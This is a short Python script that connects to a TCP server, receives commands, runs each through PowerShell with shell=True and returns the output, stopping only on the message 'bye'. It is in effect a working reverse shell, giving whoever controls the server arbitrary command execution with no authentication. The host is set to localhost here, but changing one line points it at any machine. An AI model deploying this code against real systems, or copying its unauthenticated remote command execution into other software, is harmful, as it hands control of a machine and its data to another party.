# Importing required modules
import socket # connection
import subprocess # running commands in powershell

HOST = "127.0.0.1"  # The server's hostname or IP address
PORT = 65433  # The port used by the server

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT)) # connecting to the server client.py created
    while True:
        data = s.recv(1024) # get command
        if data == b"bye": # checks if client.py terminated program
            break # terminate server,.py
        if data: # checks if data was obtained
            s.sendall(subprocess.run(["powershell", data], shell=True, capture_output=True).stdout) # run command and send the result of the command